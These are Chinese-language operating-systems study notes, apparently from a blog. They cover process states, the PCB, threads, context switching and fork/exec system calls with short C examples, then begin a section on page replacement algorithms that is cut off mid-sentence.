进程是程序功能的体现 通过多次执行，一个程序可以对应多个进程，通过调用关系，一个进程可包括多个程序。 进程和程序的区别 :\n进程是动态的，程序是静态的：程序是有序代码的集合。进程是程序的执行，进程有核心态/用户态. 进程是暂时的，程序是永久的：进程是一个状态变化的过程，程序可以长久保存。 进程和程序的组成不同：进程的组成包括程序，数据和进程控制块(进程状态信息) 进程的特点 动态性 : 可动态地创建，结果进程; 并发性：进程可以被独立调度并占用处理机运行；(并发:一段, 并行:一时刻) 独立性：不同进程的工作不相互影响；(页表是保障措施之一) 制约性 ：因访问共享数据, 资源或进程间同步而产生制约。 进程控制结构 进程控制块 在操作系统中会同时运行多个进程。每个进程都有一些数据和执行指令。这些指令可以是代码执行或在进程执行期间将用于交互的设备列表（如打印机）。因此，需要一种可以存储进程的每个进程运行时的信息的数据结构，这个数据结构称为进程控制块 ( Process Control block PCB)。\nPCB是进程存在的唯一标准\n进程的创建： 为该进程生成一个PCB 进程的终止： 回收它的PCB 进程的组织管理： 通过对PCB的组织管理来实现 PCB的组成 **PCB有以下三大类信息 **:\n进程标志信息\n进程标志信息：如本进程的标志, 本进程的产生者标志(父进程标志). 用户标志 进程号 (PID)：每个进程的唯一标识号 处理器状态信息保存区：保存进程的运行现场信息 :\n进程结构 Process structuring：进程的子id，或以某种功能方式与当前进程相关的其他进程的id，可以表示为队列 queue 、环 ring 或其他类型的数据结构 程序计数器 ( Program Counter PC)：指向该进程要执行的下一条指令地址 CPU 寄存器 ：存储进程以执行运行状态 CPU调度信息：调度CPU的时间 进程控制信息\n进程调度状态 Process Sheduling State ，指定了进程的状态，如 “ready”、“waiting ”等和一些其他信息，例如优先级、自进程获得 CPU 控制权或自进程获得 CPU 控制权以来经过的时间向量。此外，在暂停进程的情况下，必须为进程正在等待的事件记录事件标识数据。 进程状态 Process State：new, ready, running, waiting, dead 内存管理信息：页表、内存限制、段表 I/O 状态信息：分配给进程的 I/O 设备列表。 进程权限 Privileges：是否允许访问系统资源 进程间通信 IPC：独立进程之间的通信相关的标志、信号和消息 进程的状态 进程生命期管理 进程的生命周期 当一个进程执行时，它会经历不同的状态。这些阶段在不同的操作系统中可能会有所不同，并且这些状态的名称也没有标准化。但一般来将，一个进程一次可以有以下五种状态之一。而进程在执行过程中改变其状态被称为进程的声明周期 process life cycle\nState Descriptio New\u0026amp;Start 进程被首次启动/创建时的初始状态 Ready 表示进程正在等待操作系统分配CPU资源，以便其可以运行。 Running 一旦操作系统将CPU资源分配给进程，进程状态就会设置为Running，并且执行其指令。 Waiting 进程需要等待资源的完成，如：等待用户输入或等待文件变为可用，则进程进入等待状态。 Terminated Exit 当进程完成其执行，或者它被操作系统终止，其状态就会变为Exit状态，等待从主存中删除 进程的创建 引起进程创建的3个主要事件：\n系统初始化 用户请求创建一个新进程 正在运行的进程执行了创建进程的系统调用 进程运行 创建完进程时，不一定会被执行，还需要操作系统内核选择一个可以执行的进程，这种进程称之为就绪进程 Ready，让它占用CPU并执行 (为何选择？如何选择？)\n进程等待(阻塞) 在执行过程中，可能会发生等待，无法完成的事件会发生进程等待(阻塞)，通常下面情况下会触发\n请求并等待系统服务, 无法马上完成（如进程从辅存将数据读入主存，这个时间对于CPU会很慢，此时会发生等待）\n启动某种操作, 无法马上完成（如多进程协同，其他进程没有完成也会等待）\n需要的数据没有到达\n进程等待事件发起只能进程自己阻塞自己，因为只有进程自身才能知道何时需要等待某种事件的发生。\n进程唤醒 进程唤醒是将进程的等待状态转换为就绪态，意味着该进程可以被CPU去调度执行。唤醒进程的原因 :\n被阻塞进程需要的资源可被满足 被阻塞进程等待的事件到达 将该进程的PCB插入到就绪队列 进程只能被别的进程或操作系统唤醒\n进程结束 在以下四种情况下, 进程结束 :\n正常退出（自愿） 错误退出（自愿） 致命错误（强制性） 被其他进程杀死（强制性） 进程的变化模型 两态模型 两态模型 Two state 是指，进程主要有两个状态：\nNot-running：非运行状态是指，进程正在等待执行 Running：运行状态是指当前正在运行的状态 如图可以看出，当操作系统创建进程时，会为该进程初始化PCB；当进程被事件打断，操作系统会将该进程从Running状态转换到到Not-running状态。\n三态模型 三态模型是两态模型的改善，在两态模型中，存在一个主要的缺点。当调度器将一个新进程从非运行态转换为运行态时，该进程可能仍在等待某个事件或 I/O请求。因此，调度器必须遍历队列并从中找到准备好执行但还未运行进程。这样的话效率很低。而且两态模型总体来说不能算满足进程的生命周期。\n为了克服这个问题，三态模型将 Not-running 状态分为两种情况：\n就绪 Ready：一个进程获得了除CPU之外的一切所需资源，等待CPU分配时间片 等待 Waiting（阻塞 Blocked）：进程在等待某一事件而暂停运行；如等待某资源，等待输入/输出完成。 操作系统会为Ready和Waiting维护一个单独的队列。一旦进程的等待的事件完成，进程就会从阻塞态进入就绪态。\n五态模型 五态模型，是在三态模型的基础上，加入了进程的两个新状态**：New** 和 Terminated。\n为什么会有五态\n在之前三态模型中，进程有状态代表的，在主存储器中加载所有进程。很显然这是不可能实现的。所以当创建一个新进程时，程序并不会立即加载到主存中。操作系统仅在主存中存储有关进程的一些信息。当内存有足够可用空间时，长期调度器 long term scheduler 会将程序移动到主存。这样的过程就是New。\n五态模型下的状态 Running：当前正在执行的进程；也可以理解为当前占用CPU时间的进程。 Waiting/Blocked： 等待某些事件的进程，如 I/O，等待其他进程，同步信号等。 Ready：等待执行的进程；也可以理解为等待分配CPU时间的进程。 New：刚创建的新进程。PCB已经初始化完成，但程序尚未加载到主内存中。程序保持在New状态，直到长期调度器 long term scheduler 将进程转换到Ready状态（已在主内存中）。 Terminated/Exit：完成的进程或中止的进程。 五态模型下的状态变化过程\nNULL -\u0026gt; New：新进程的创建过程\nNew -\u0026gt; Ready：当有足够的可用资源时，长期调度程序从辅存中选择一个New状态的进程并将其加载到主存中。该进程现在处于Ready状态，等待分配CPU时间。\nReady -\u0026gt; Running ：短期调度器Short Term Scheduler 或调度器将一个进程从Ready调度到Running，标记着该进程正在被执行。\nRunning -\u0026gt; Exit：当进程完成执行或中止，操作系统将进程从Running移动到Exit。\nRunning -\u0026gt; Ready： 当一个进程运行了一定时间而没有任何中断时，可能会发生这种变化；如，轮训调度算法。另一个常见的情况是，如果处于就绪状态的进程的优先级高于当前正在运行的进程的优先级，操作系统会抢占正在运行的进程并将其改变为就绪状态。\nRunning -\u0026gt; Waiting：进程必须等待某个事件，则将其置于Waitting状态。如：进程可能会请求一些可能不可用的资源或内存事，该进程可能正在等待 I/O 操作，或者该进程正在等待其他进程完成，然后才能继续执行。\nWaiting -\u0026gt; Ready：进程完成了等待的事件，将从Waitting状态进入Ready。\n进程挂起模型 进程挂起 process suspension，是为了合理且充分地利用系统资源。进程在挂起状态时, 意味着进程没有占用内存空间，处在挂起 Suspended 状态的进程把进程放到磁盘上。当一个挂起进程准备好时运行时，它会进入 Ready-Suspend 队列中。因此，挂起状态也分为两个状态，即 阻塞挂起 Blocked Suspend 和 就绪挂起Ready Suspend。\n六态模型 六态模型通常情况下是具有挂起状态的五态模型。在六态模型存在一个缺陷，众所周知处理器比 I/O 设备要快很多。因此，会出现CPU执行速度过快导致所有进程都处于阻塞态而没有进程处于就绪态的情况。此时CPU 处于空闲状态，直到至少有一个进程完成 I/O 操作。这种情况下会导致 CPU 利用率低。\n为了防止这种情况发生，即如果主存中的所有进程都处于阻塞态，操作系统会挂起( Suspended ) 处于阻塞态的进程并将其移动到辅存中。这种过程称为交换。所有处于挂起状态的进程都保存在一个队列中，内存被释放。此时，CPU 可以将一些其他进程带入主存。起到更好的利用CPU资源\n六态模型的状态转换\n在六态模型中，除了五态模型的转换外，还具有下述的几个状态间装换：\nWaiting -\u0026gt; Suspend：如果主存中的所有进程都处于等待状态，操作系统将进程从Waitting转换为到Suspended Suspend -\u0026gt; Ready：当有足够的内存可用时，操作系统将处于Suspended状态的进程移回主内中执行。 Suspend -\u0026gt; Waiting：操作系统从辅存换入到主存的进程仍在等待某个事件的完成。 七态模型 七态模型是将六态模型的阻塞状态又严格的分为 阻塞挂起（Blocked Suspend) 和 就绪挂起 (Ready Suspend )\n阻塞挂起（Blocked Suspend) ：进程在辅存中，尚未Ready。\n就绪挂起 (Ready Suspend )：:进程在辅存中, 但只要进入内存，即可运行。\n七态模型的状态转换\n在内存中会出现的转换情况\nBlocked -\u0026gt; Blocked-Suspend：如果主存中的所有进程都处于Waiting状态，则处理器将至少一个等待进程换回辅存以释放内存使得CPU资源被有效的利用。 Ready -\u0026gt;Ready-Suspend：当具有高优先级发生阻塞等待，操作系统会认为该进程很快会被就绪，此时，操作系统会选择挂起低优先级就绪进程，从Ready移动到Ready-Suspend，以释放主内存用于更高优先级的进程 Running -\u0026gt;Ready-Suspend：对抢先式分时系统，当有高优先级阻塞挂起进程因事件出现而进入就绪挂起时, 系统可能会把运行进程转换为就绪挂起状态。 New -\u0026gt; Ready-Suspend：如果主存使用空间不足，操作系统可能会将新进程移动为Ready-Suspended 状态。 在外存会出现的转换情况\nBlocked-Suspend -\u0026gt; Ready-Suspend： 当有阻塞挂起因相关事件得到满足时，操作系统会把Blocked-Suspend 进程转换为Ready-Suspend。 与挂起相关的状态转换（将进程从外存转入内存）\nReady-Suspend -\u0026gt; Ready：当处于Ready-Suspend的高优先级进程高于Ready的进程，则操作系统会将其与主存中的较低优先级Ready进程交换。 Blocked-Suspend -\u0026gt; Blocked：当主存空间足够时, 系统会把一个高优先级Blocked-Suspend进程(系统认为会很快出现所等待的事件)进程转换为Blocked状态 Reference\nprocess state models\nprocess-scheduling\nprocess suspension\n进程队列 进程队列 (Process Queues) 是操作系统为管理进程的各种状态维护不同类型的队列，PCB会被存放在相同状态的队列中。如果进程状态发送改变，那么PCB也会进行转换到新的状态队列中。\n工作队列 Job queue：保存操作系统中所有的进程，存储在辅存中 就绪队列 Ready queue： 保存在主存中，短期调度器负责分配CPU时间 等待队列 Waiting Queue 或 Device queues：当进程发生阻塞事件，即需要I/O，此时进程会从 Ready转换为 Waitting 状态，进程的上下文 Context（PCB），都将存储在在等待队列中。 Reference\nProcess scheduling\n线程 线程 Thread 是进程中的一条执行流程，线程是CPU独立运行的基本单位，由程序计数器（PC），Stack，和一组寄存器组成。Code、File和Data段等可以在不同的线程共享。\n由上图可以看出，线程的组成比进程要少一些，进程的主要构成是：\nStack Section Heap Section Data Section Text Section 而线程主要构成部分是：\n独立的Stack Heap 与进程共享 Data 与进程共享 Text 与进程共享 线程的控制结构 线程控制块 TCB，是操作系统中的数据结构，每个线程都会维护一个TCB，TCB则是操作系统中线程的表现方式。\n线程的特点 线程的优点 线程减少了上下文切换时间，这有助于管理任务的时间； 各个线程之间可以并发地执行； 各个线程之间可以共享地址空间和文件等资源； 线程的缺点 整个进程过分依赖线程，如单个线程中断，则整个进程中断并阻塞。 安全可靠性无保障：因为共享data（全局变量在线程间共享），这会产生安全问题。 多线程优点大概分为以下四类：\n响应能力： 交互式应用程序的多线程可以允许程序继续运行，即使它的一部分被阻塞或正在执行冗长的操作，从而提高对用户的响应能力。例如，多线程网络浏览器仍然可以允许用户交互\n在另一个线程中加载图像时在一个线程中。\n资源共享：线程共享其所属进程的内存和资源。\n经济：因为线程共享所属进程的资源，线程的创建和上下文切换线程更\n更高效的利用多处理器：每个线程可以在不同的处理器上并行运行，而一个单线程进程只能在一个 CPU 上运行，多线程增加了并发性。\n线程与进程的比较 进程是最小的资源分配单位，线程是最小的CPU调度单位 进程拥有一个完整的资源平台，而线程只独享必不可少的资源，如寄存器和栈； 线程同样具有就绪、阻塞、执行三种基本状态，同样具有状态之间的转换关系； 线程能减少并发执行的时间和空间开销； 创建时间 终止时间 切换（如页表切换、CPU上下文切换） 不同的进程CPU分别执行，不同的线程视为同一个任务 资源的使用（IPC和资源共享） 线程的实现 现代系统中实现了两种类型的线程 用户线程 (User-Level Threads)和内核线程(Kernel-Level Threads)。\n内核线程是操作系统内核支持的线程，由操作系统直接管理。所有现代操作系统都支持内核级线程。 内核知道并管理所有线程。 每个进程一个进程控制块 (PCB)。 系统中每个线程一个线程控制块 (TCB)。 提供系统调用：可以从用户空间创建和管理线程。 用户线程是存与用户空间，并且在没有内核支持的情况下进行管理；内核不知道用户线程。从内核的角度来看，进程是一个不透明的黑匣子。 线程完全由运行时系统 run-time system （用户级线程库）管理。 理想情况下，线程操作应该与函数调用一样快。 内核不知道用户线程的存在，管理用户线程与管理单进程一样。 用户线程模型 通常，可以使用一下四种模型之一来实现用户线程。\n多对一 一对一 多对多 两级 以上所有模型都是将用户级线程映射到内核级线程。而内核线程又类似于非线程（单线程）系统中的进程。内核线程是内核调度在CPU上执行单元。\n多对一 在多对一模型是将所有用户线程都映射到同一个内核线程上执行。该进程一次只能运行一个用户线程。\n从图可以看出，一对一模型的特点如下：\n多个用户线程都映射到单个内核线程上。 线程对内核不透明，线程的管理是由用户空间的线程库处理，效率很高。 如果发生阻塞的系统调用，那么整个进程都会阻塞，即使其他用户线程能够继续执行。 因为单个内核线程只能在单个 CPU 上运行，所以多对一模型不允许将单个进程拆分到多个CPU上。 一对一 在一对一模型中，内核必须提供一个系统调用来创建一个新的内核线程。\n一对一模型的特点：\n在一对一模型中，一个单独的内核线程用户来处理一个用户线程。 一对一模型有效的克服了一对多模型中涉及阻塞式系统调用和跨CPU拆分进程的问题。 管理一对一模型的开销更大，大的开销将减慢系统的调用速度。 该模型中，的大多数实现都对可创建的线程数量进行了限制。 多对多 在多对多模型中，进程将分配了 m 个内核级线程来执行 n 个用户级线程。\n多对多模型的特点：\n可将任意数量的用户程多路复用到数量相等或更少的内核线程上。 用户对创建的线程数没有限制。 阻塞内核级系统调用不会阻塞整个进程。 进程可以跨多个处理器拆分。 两级 两级模型（Two-Level）是严格意义上的多对多模型，可以为单个用户线程专门一对一绑定内核线程的能力的模型\n用户线程缺点 用户级线程与操作系统的集成度不高；如用空闲线程调度进程，阻塞其线程发起 I/O 的进程，即使该进程有其他线程可以运行，以及有锁的线程取消调度进程。\n用户级线程需要非阻塞系统调用，否则，当一个线程阻塞，即使进程中还有可运行的线程，整个进程也会在内核中阻塞。例如，如果一个线程导致页面错误，则进程阻塞。\n用户线程和操作系统内核之间缺乏协调性；无论进程有 1 个线程还是 1000 个线程，都仅能获得一个CPU时间片。由每个线程主动将控制权交给其他线程。\n由于进程时资源分配的最小单位，多线程情况下，每个线程得到的时间片较少，执行会较慢。\n内核级线程优缺点 优点：\n线程对操作系统内核透明，调度程序可以决定给拥有大量线程的进程比拥有少量线程的进程更多的时间。 内核级线程适用于经常阻塞的应用程序。 缺点：\n内核级线程缓慢且效率低下；如，操作内核级线程比用户级线程慢。 由于内核管理和调度线程与进程。每个线程又需要一个完整的TCB来维护有关线程的信息。因此，存在大量开销并增加了内核复杂性。 Reference\nUser-level Thread Library\nimplementing threads\nThreads\n进程控制 上下文切换 Introduction 上下文（Context）是指，进程的CPU占用被移除时，需要存储进程的相关信息，以便稍后获得处理器时，可以从相同的状态继续运行。这个状态数据被称之为上下文。可以理解为为上下文对进程的就如同书签对一本书。\n上下文切换（Context Switch）是将CPU占用的时间片从一个进程或切换到另一个的过程。在这种现象中，处于运行状态的进程的执行会被挂起，而另一个处于就绪态的进程则会占用CPU时间。\n在操作系统中，什么情况下会发生上下文切换？\n当进程终止时 当CPU计时器超时，应该切换到其他进程时 当前进程挂起 当前进程需要一些时间等待I/O事件 当来自计时器之外的中断产生，如优先级高的进程抢占 上下文切换时需要存储什么上下文?\n当进程从一种状态转换到另一种状态时，操作系统必须更新进程PCB信息。PCB是一种数据结构，在操作系统中用于将所有与数据相关的信息存储到进程和上下文中。PCB包含进程，即寄存器、时间片、优先级等。\n进程的上下文包含：\n地址空间、Stack空间、虚拟地址空间 寄存器集，如进程计数器（PC）、Stack指针（SP）、指令寄存器（IR）、程序状态寄存器（PSW） 所有信息都会保存在PCB中\n什么时候会触发上下文切换\n上下文切换只要发生在三种情况下：\n多任务：一个进程从CPU 中换出，下一个可运行进程换入。在抢占式系统只不过，进程可能会被调度器换出。 中断处理：当中断发生时，硬件切换部分上下文。这会自动发生。 用户空间到内核空间：操作系统在用户空间和内核空间之间进行转换时，会发生上下文切换。 上下文切换的过程 又图可以看出P1占用CPU，P2处于就绪状态。如果发生中断或进程发生 I/O 事件，则 P1将会被换出；在更改 P1 的状态前，会将P1 的上下文保存在寄存器中，并将PC保存到 PCB1。之后，将加载PCB2上下文信息，此时PC从就绪状态转变为运行状态。\n类似地，P2发生中断，恢复P1恢复执行。P1 从 PCB1 重新加载到运行状态以在上次停止时间重新执行任务。如信息丢失，并且CPU再次执行该进程时，会从其初始状态开始执行。\nReference\ncontext-switching in os\n进程创建 进程创建是操作系统给用户使用的一个系统调用，用来完成新进程的创建工作。在Unix中进程的创建采用 fork()/exec() 系统调用来完成新进程的创建\nfork() 的功能是创建一个与调用它的进程的几乎完全相同的副本 使用父进程的资源（例如，打开的文件）初始化新进程 PC、SP与父级相同 使用父进程的地址空间的内容作为副本初始化一个新地址空间 fork() 的系统调用会返回两次 父进程会返回子进程的PID 子进程返回0，失败返回-1 exec() 的功能是用新的进程替换当前进程，exec会将程序加载到当前的地址空间内并从头开始执行。 进程的Text、Data、Stack段会被替换成新的 exec()系统调用是使用了新程序替换了当前进程，因此PID没有发生改变 exec()的调用时由调用的进程发起的，被执行的是一个新程序，并不是一个进程，没有创建新进程 exec()系统调用不会返回给调用程序在执行，除非exec() 执行出错。 一个fork()示例：\nint main(void) {\rprintf(“Parent (PID = %d)\\n”, getpid());\rfork();\rprintf(“My PID is %d\\n”, getpid() );\rreturn 0;\r}\r一个exec()示例\nint main(void) {\rprintf(“before execl\\n”);\rexecl(“/bin/ls”, “/bin/ls”, NULL);\rprintf(“after execl\\n”);\rreturn 0;\r}\rfork()是如何工作的\n在内核空间内，进程被排列成一个双向链表，称为任务列表。 父进程1234调用fork() PCB会在内核空间内被复制，同时用户空间的代码也会被复制 子进程返回0，父进程返回子进程的PID Reference\nprocess management\n进程加载 进程加载是指，用户程序通过exec()系统调用进行加载。\nexec()系列函数用新的用户程序替换当前的进程的地址空间\n通过exec()更改子进程正在执行的程序代码来转换子进程，切换后的程序从main()开始执行 允许程序加载时指定启动参数；execvp(argv[1], \u0026amp;argv[1]) 当调用成功时 两个为相同的进程，仅仅做了替换，不会生成新的进程 运行的是不同的程序 exec()是如何工作的\n清除局部变量和动态分配的内存 全局的程序（代码）和常量会被替换为新的程序（代码）和常量 全局变量重置为基于新代码的 进程等待与退出 进程的等待 等待和退出实际上是父子进程间的交互，完成子进程的资源回收\nwait()系统调用用于父进程等待子进程的结束 子进程被创建并被执行后，父进程会被挂起，父进程通过wait()系统调用等待子进程返回值并再次获得控制权 子进程调用exit()唤醒父进程，将exit()返回值作为父进程中wait()的返回值 有僵尸子进程等待时，wait()立即返回其中一个值 无子进程存活，wait()立即返回 进程的有序退出 进程在执行结束时调用exit()，完成进程资源回收。exit() 是一个系统调用，有如下功能：\n接受退出状态作为参数传给父进程。 资源回收 关闭所有文件和套接字 释放内存 释放创建出进程相关的数据结构 检查子进程是否存活，保留结果值直到父进程需要，进入zombie状态 否则释放所有数据结构，进程结束 其他进程控制系统调用 上述是对进程模型流的一些进程控制的系统调用，但操作系统还必须包含对进程的特殊控制：\n优先级操作 nice()，指定进程的初始优先级进 在UNIX中，进程优先级会随着进程对CPU的消耗而减少 调试的支持：ptrace()，允许一个进程来控制另一个进程，如设置断点、查看寄存器。 定时：Sleep()可以将进程置于定时器等待队列中，等待数秒 Reference\nProcess Management\n","permalink":"https://www.oomkill.com/2022/04/ch7-process-management/","summary":"","title":"ch7 进程管理"},{"content":"Overviews 功能与目标 实验设置与评价方法 局部页面算法 最优页面置换算法 先进先出算法 最近最久未使用算法 时钟页面置换算法 最不常用置换算法 Belady现象 LRU FIFO Clock对比 全局页面置换算法 工作集模型 工作集页面置换算法 缺页率置换算法 功能与目标 功能 : 当缺页中断发生，需要调入新的页面而内存已满时，选择内存当中哪个物理页面被置换。\n目标 : 尽可能地减少页面的换进换出次数(即缺页中断的次数)。 具体来说，把未来不再使用的或短期内较少使用的页面换出，通常只能在局部性原理指导下依据过去的统计数据来进行预测。\n页面锁定 frame locking：用于描述必须常驻内存的操作系统的关键部分或时间关键（time critical）的应用进程。实现的方式是：在页表中添加锁定标记位(lock bit)。\n实验设置与评价方法 实例：记录一个进程对页访问的一个轨迹\n举例 : 模拟一个实验环境，记录对应的地址访问序列，虚拟地址跟踪(页号, 偏移)\u0026hellip; (3,0) (1,9) (4,1) (2,1) (5,3) (2,0) \u0026hellip; 而offset可以忽略（页不存在才会产生 page fault），生成的页面轨迹 3, 1, 4, 2, 5, 2, 1, \u0026hellip;（替换为，3,1,4,2,5,2,1） 模拟一个页面置换的行为并且记录产生页缺失数的数量\n更少的缺失，更好的性能 局部页面置换算法 最优页面置换算法 基本思路：当一个缺页中断发生时，对于保存在内存当中的每一个逻辑页面，计算在它的下一次访问之前，还需等待多长时间，从中选择等待时间最长的那个，作为被置换的页面。\n这是一种理想情况, 在实际系统中是无法实现的, 因为操作系统无法知道每一个页面要等待多长时间以后才会再次被访问.\n最优页面置换算法（Optimal Page Replacement）可用作其他算法的性能评价的依据，(在一个模拟器上运行某个程序, 并记录每一次的页面访问情况，在第二遍运行时即可使用最优算法)\n在该算法中，会替换在未来最长持续时间内不会使用的页面。如下图所示有 a b c d e五个页，但是只有四个页帧。此时会产生物理页不够，会产生 Page Fault。\n前四次因为a b c d 已经存在物理页帧中，故前四次不会产生缺页中断，第5次请求e不在物理页帧，此时会产生page fault，发生页面置换。可以看出目前最久不会被访问的页面为d，故将d替换出。\n先进先出置换算法 先进先出页面置换算法 First In First Out (FIFO)，这是最简单的页面替换算法。在这个算法中，操作系统在一个队列中跟踪内存中的所有页面，最旧的页面在队列的前面。当一个页面需要被替换时，队列前面的页面被移除，进行置换。\n性能较差, 调出的页面有可能是经常要访问的页面。并且有belady现象，FIFO算法很少单独使用.\nFIFO算法实现起来非常简单。通过对主存储器中的队列来跟踪所有页面。一旦页面进入，我们就会将其放入队列并继续。这样，最旧的页面将始位于于队列中的第一位。\n图是FIFO的伪代码\nReference\nfifo-page-replacement\npage replacement algorithms\n实例，0时刻物理页中存放了 a b c d虚拟页，\n当时刻为5时，此时e不在物理页帧中，触发 page fault进行页面置换，假设 0 时刻时 入栈顺序为 a-b-c-d，此算法将会把a置换出，把e置换入。后续的换入换出也是按照进入队列顺序进行替换\n最近最久未使用页面置换算法 最近最久未使用，Least Recently Used。基本思路是LRU会在一段时间内跟踪页面的使用情况，当发生缺页时，将最长时间未使用的页面替换为新请求的页面。\nLRU是与OPT近似的一个算法，该算法基于程序的局部性原理，即在最近时间内, 被频繁地访问页面, 再将来的一小段时间内，还可能会再一次被频繁地访问。\nLRU 根据历史推测未来 OPT 根据未来推测未来 实例，0时刻物理页中存放了 a b c d虚拟页，\n当访问5时刻时，此时该替换的应该为最久没有被访问的页面，此时c上次访问时间为1，c为最久没有被访问的页面。\n时钟页面置换算法 时钟页面置换算法 The Clock Algorithm，是类似于LRU的一种算法，对FIFO的一种改进\n基本思路 :\n需要用到页表项的访问位，当一个页面被装入内存时，把该位初始化为0。 然后如果这个页面被访问，则把该位置设为1; 把各个页面组织成环形链表(类似钟表面)，把指针指向最老的页面(最先进来的)； 当发生一个缺页中断时，考察指针所指向的最老页面，若它的访问位为0，立即淘汰；若访问位为0，然后指针往下移动一格。如此下去，直到找到被淘汰的页面，然后把指针移动到下一格。 实例：维护一个驻留在内存中的链表，指针指向上一次访问的位置\n使用时钟（或use/reference bit）位来记录页面的访问频率 每当引用页面（被访问）时，都会设置reference bit 为 1 时钟指针扫过页面，寻找 reference bit = 0 的页面，替换时钟扫过一圈未被引用的页面\n实例：0时刻物理页中存放了 a b c d虚拟页，在 1 2 3 4时刻请求时，此时会命中，并且在访问时，将reference bit 设置为1，由下图可见\n当时刻为5时，触发置换条件，此时时钟所有reference bit 都为 1，此时会转到第二圈，由于第一圈全将reference bit 设置为0，故，替换的页为 a，同时指针指向下个位置\n二次机会算法 二次机会置换算法 Second Chance，是对时钟算法的一个改进，具体表现为如下几个方面：\n为每个帧添加一个 drity bit。 当每次引用时，将 该 drity bit 设置为1 ； 这样就为该页面提供了二次机会。 当需要找到被置换出的页面时，请在时钟（维护的帧列表）中循环查找 如 drity bit=1，则将其重置（设置为零）并继续。 如 drity bit=0，则置换出该物理帧中的页面。 增加了 drity bit 如 drity bit=0，此时仅为读操作，在置换时无需做写入操作。这样也被称作，增强时钟算法 Enhance Clock。\n实例：0时刻物理页中存放了 a b c d虚拟页，在 1 2 3 4时刻请求时，此时会命中，并且在访问时，将reference bit 设置为1，并且，区分了读写操作，基于这种方式可以清楚的了解那页可以被置换出。\n因为做了写操作，当时刻为4时，a b 的dirty bit 都为1。在经过两轮后，将00位的页替换出，同时指针指向下一位，则替换出C，并将指针指向下一位\nReference\nSecond Chance Page Replacement Policy\n最不常用置换算法 最不常用置换算法 Least Frequently Used，并不是说算法本身不常用，而是说在该算法中，系统会跟踪内存页的引用次数。当发生 Page Fault时，会置换出使用频率最低的页。\n设计思路， LFU是在每个页表项都有增加一个计数器，对于每次内存引用，MMU 都会递增该计数器。当发生缺页中断时，操作系统选择计数器最小的页作为置换。\n实例，有如下页面，此时物理页帧仅有三个，执行图如下：\n0 1 2 3 0 1 2 3 0 1 2 3 4 5 6 7\nPage Fault = $12 \\div 16 = 75%$\nBelady现象 Belady现象也可以称作Belady异常 beladys anomaly，是在操作系统中，随着增加物理页帧数量会导致``Page fault`数量增加的现象。\n如 : FIFO算法的置换特征与进程访问内存的动态特征是矛盾的，与置换算法的目标是不一致的（即替换较少使用的页面），因此，被他置换出去的页面不一定是进程不会访问的。\n如：\nf 标记位为 缺页中断。\nPage Requests 3 2 1 0 3 2 4 3 2 1 0 4 Newest Page 3f 2f 1f 0f 3f 2f 4f 4 4 1f 0f 0 3 2 1 0 3 2 2 2 4 1 1 Oldest Page 3 2 1 0 3 3 3 2 4 4 示例1：当存在3个物理页面时 Page Fault = 9。\nPage Requests 3 2 1 0 3 2 4 3 2 1 0 4 Newest Page 3f 2f 1f 0f 0 0 4f 3f 2f 1f 0f 4f 3 2 1 1 1 0 4 3 2 1 0 3 2 2 2 1 0 4 3 2 1 Oldest Page 3 3 3 2 1 0 4 3 2 示例2：当存在4个物理页面时 Page Fault = 10。\n如何避免：使用stack 算法\n什么是stack算法 堆栈算法是指，大小为N的集合始终是大小为N+1集合的子集。\n例如：一个大小为N页的集合保存在内存中的页面始终是大小为 N + 1 的帧保存的页面的子集。\n如 具有3 帧的内存中的 {0,1,2} 不是具有 4 帧内存中 {0,1,4,5} 的子集 ，这种情况下基于堆栈的算法的。\n从上面belady现象可以看出，从 4 3 2 1 0 4 开始是违反基于堆栈的算法的属性\nPage Requests 4 3 2 1 0 4 Newest Page 4f 3f 2f 1f 0f 4f 0 4 3 2 1 0 1 0 4 3 2 1 Oldest Page 2 1 0 4 3 2 Page Requests 4 3 2 1 0 4 Newest Page 4f 4 4 1f 0f 0 2 2 2 4 1 1 Oldest Page 3 3 3 2 4 4 Reference\nwhy stack-based cache algorithms avoidbeladys-anomaly\npage replacement algorithms\n为什么stack-based算法不会发生belady现象 基于堆栈的算法不会产生Belady 现象，这是因为这些类型的算法会为页面（用于替换）分配一个优先级，该优先级与页帧的数量没有管理。如 Optimal、LRU 和 LFU。此外，此类算法还具有良好的模拟特性，即通过一次引用可以计算出任意数量的页帧的命中率缺页率。\nPage Requests 1 2 3 4 1 2 5 1 2 3 4 5 Newest Page 1 2 3 4 1 2 5 1 2 3 4 5 1 2 3 4 1 2 5 1 2 3 4 Oldest Page 1 2 3 4 1 2 5 1 2 3 Page Fault F F F F F F F F F F Page Requests 1 2 3 4 1 2 5 1 2 3 4 5 Newest Page 1 2 3 4 1 2 5 1 2 3 4 5 1 2 3 4 1 2 5 1 2 3 4 1 2 3 4 1 2 5 1 2 3 Oldest Page 1 2 3 4 4 4 5 1 2 Page Fault F F F F F F F F 由上述两表可以看出，在LRU算法中，每次引用一个页面时，它都会移动到堆栈的顶部，因此堆栈的顶部的n个页面是最近使用的n个页面*。*即使帧数增加到 n+1，堆栈顶部也会有 n+1 个最近使用的页面。 构成基于堆栈的算法。\nLRU / FIFO 和 Clock 的比较 LRU和FIFO都是先进先出的思路，只不过LRU是针对页面最近访问时间来进行排序，所以需要在每一次页面访问的时候动态地调整各个页面之间的先后顺序(有一个页面的最近访问时间变了)。而FIFO是针对页面进入内存的时间来进行排序，这个时间是固定不变的, 所以各个页面之间的先后顺序是固定的。如果一个页面在进入内存后没有被访问，那么它的最近访问时间就是它进入内存的时间。 换句话说，如果内存当中的所有页面都未曾访问过，那么LRU算法就退化为了FIFO算法。\n例如 : 给进程分配3个物理页面, 逻辑页面的访问顺序是 : 1,2,3,4,5,6,1,2,3 \u0026hellip;\n全局页面置换算法 局部页面置换算法是基于单一程序来说明的，但对于操作系统来讲，执行的程序有很多，如果每个程序使用固定的页面置换算法会产生一定的问题，所以全局页面置换算法就是解决这种问题的。\n存在问题，随着物理页帧的增加，通常情况下会大大减少缺页的次数，而为每个程序分配固定的物理页帧则会大大限制了程序执行的性能；程序是一个动态变化的过程，对内存的需求是可变的。\n工作集模型 如果局部性原理不成立，那么各种页面置换算法就没有说明分别，也没有什么意义。例如：假设进程对逻辑页面的访问顺序是1,2,3,4,5,6,6,7,8,9...，即单调递增，那么在物理页有限的前提下, 不管采用何种置换算法，每次的页面访问都必然导致缺页中断。 如果局部性原理是成立的，那么如何来证明它的存在，如何来对它进行定量地分析? 这就是工作集模型. 什么是工作集：进程当前正在使用的页面集称之为工作集 Working Set，可以用一个二元函数来表示：$W(t, \\tau )$；在区间$[t-\\tau+1..t] $ 内的页数。\nt是当前执行的时刻 $\\tau$ 